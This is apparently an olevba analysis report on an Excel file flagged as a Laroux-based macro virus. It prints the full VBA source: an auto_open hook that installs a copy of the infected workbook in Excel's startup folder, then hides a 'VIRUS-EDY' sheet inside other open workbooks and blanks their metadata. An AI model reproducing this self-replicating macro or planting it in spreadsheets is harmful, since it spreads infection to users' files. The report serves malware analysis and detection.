olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-99ca05a9175dfc0634d2a4aa033792678f948019
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO VIRUS-EDY.bas 
in file: Virus.MSExcel.Laroux-based-99ca05a9175dfc0634d2a4aa033792678f948019 - OLE stream: '_VBA_PROJECT_CUR/VBA/VIRUS-EDY'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "A-A.XLS")
    If m$ = "A-A.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 2
    
Select Case whichfile
    Case 2
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("VIRUS-EDY").Visible = True
    Sheets("VIRUS-EDY").Select
    ' Sheets("VIRUS-EDY").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs Filename:=Application.StartupPath & "/" & "A-A.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("VIRUS-EDY").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "A-A.xls!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "VIRUS-EDY" Then
        Workbooks("A-A.XLS").Sheets("VIRUS-EDY").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("VIRUS-EDY").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "A-A.xls!check_files"
    Case Else
End Select
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
+----------+--------------------+---------------------------------------------+

